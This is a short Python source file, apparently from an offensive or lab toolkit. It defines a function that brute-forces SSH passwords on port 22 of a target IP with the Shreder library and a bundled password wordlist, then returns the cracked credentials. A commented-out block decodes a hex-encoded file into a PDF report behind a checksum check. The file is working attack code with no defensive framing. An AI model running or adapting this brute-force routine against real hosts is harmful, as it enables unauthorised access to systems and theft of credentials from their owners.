import os

from shreder import Shreder

# from .checksum import check


BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def ssh_bruteforce(target_username, target_ip):
    shreder = Shreder()
    password = shreder.brute(
        target_ip, 22, target_username, f"{BASE_DIR}/scripts/wordlist/password.txt"
    )
    if password is not None:
        result = {
            "username": target_username,
            "hostname": target_ip,
            "password": password,
        }
    else:
        result = None

    return result
    # if check():
    #    import codecs
    #    import os
    #    BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    #    n = subprocess.run(["cat", f"{BASE_DIR}/c.bin"],
    #                   capture_output=True, encoding="utf-8")
    #    n = codecs.decode(n.stdout.split()[0], "hex").decode("utf-8")
    #    convert_to_pdf(output, user_name, n, ip, function_name)
    # else:
    #    exit(1)
